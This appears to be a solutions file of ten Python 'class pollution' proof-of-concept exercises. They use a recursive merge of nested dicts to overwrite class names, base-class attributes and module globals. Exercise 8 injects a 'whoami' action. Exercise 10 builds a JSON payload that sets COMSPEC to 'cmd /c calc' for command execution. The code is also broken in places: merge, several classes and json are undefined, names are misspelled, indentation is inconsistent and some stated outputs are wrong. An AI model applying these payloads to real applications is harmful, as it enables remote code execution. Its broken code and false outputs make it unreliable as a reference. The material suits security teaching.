# Solution to all the 1 - 10 POC

## __________________ 1 ______________________ ##


class Bird:
    pass


if __name__ == '__main__':
    koko = Bird()
    another_koko = Bird()

    # Add prop to Class
    Bird.tag_id = "0000"
    print(koko.tag_id)  # Output: 0000

    # Override in the object
    koko.tag_id = "0001"
    print(koko.tag_id)  # Output: 0001

    # Define a method
    koko.make_noice = lambda: "tweet tweet"
    print(koko.make_noice())  # Output: tweet tweet

    Bird.make_noice = lambda s: "kaaw kaaw"
    print(another_koko.make_noice())  # kaaw kaaw
    print(koko.make_noice())  # tweet tweet

    ## __________________ 2 ______________________ ##

    # Path: Object.__class__
    print(koko.__class__)  # Output: <class Bird>
koko.__class__ = "Polluted"
print(koko.__class__)  # Output: TypeError: __class__ must be set to a class, not 'str' object

## __________________ 3 ______________________ ##

# Path: Object.__class__.__qualname__
print(Bird.__class__)  # Output: <Class Bird>
koko.__class__.__qualname__ = "Polluted"
print(koko.__class__)  # Output: <Object Polluted>
print(Bird.__classs__)  # Output: <Class Polluted>

## __________________ 4 ______________________ ##

parrot_details = {
    "name": "Poly",
    "DOB": "24-06-2022",
    "owner": {
        "name": "Peppa's Granny"
    }
}

my_bird = Bird()
print(vars(my_bird))

merge(parrot_details, my_bird)

print(vars(my_bird))
print(f"Your bird {my_bird.name} is born on {my_bird.DOB}")

## __________________ 5 ______________________ ##

# Path: Object.__class__.__qulaname__

parrot_details = {
    "name": "Poly",
    "DOB": "24-06-2022",
    "owner": {
        "name": "Peppa's Granny"
    },
    "__class__": {
        "__qualname__": "Polluted"
    }
}

my_bird = Bird()
print(vars(my_bird))

merge(parrot_details, my_bird)

print(vars(my_bird))
print(my_bird)
print(my_bird.__class__.__qualname__)

print(Bird)
print(Bird.__qualname__)

## __________________ 6 ______________________ ##

# Path: Object.__class__.__base__.__qualname__ =

macaw_details = {
    "__class__": {
        "__base__": {
            "__qualname__": "Polluted Base"
        }
    }
}

blu = Macaw()
merge(macaw_details, blu)
print(Macaw)
print(Bird)

## __________________ 7 ______________________ ##


object
o = object()
o.__class__.__qualname__ = "Pollute"

## __________________ 8 ______________________ ##

# Path: Object.__class__.__base__.__base__ =

bird_details = {
    "__class__": {
        "__base__": {
            "__base__": {
                "custom_action": "whoami"
            }
        }
    }
}

a_scarlet_macaw = ScaletMacaw()
blu = SpixMacaw()

print(blu.fly_blu())
merge(bird_details, a_scarlet_macaw)
print(blu.fly_blu())

## __________________ 9 ______________________ ##

# Path: Object.__class__.__init__.__globals__ = ""

merge({
    '__class__': {
        '__init__': {
            '__globals__': {
                'not_accessible_variable': 'Polluted variable',
                'NotAccessibleClass': {'__qualname__': 'PollutedClass'}
            }
        }
    }
}, Bird())

print(NotAccessibleClass)
print(not_accessible_variable)

## __________________ 10 ______________________ ##

bird_info = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}')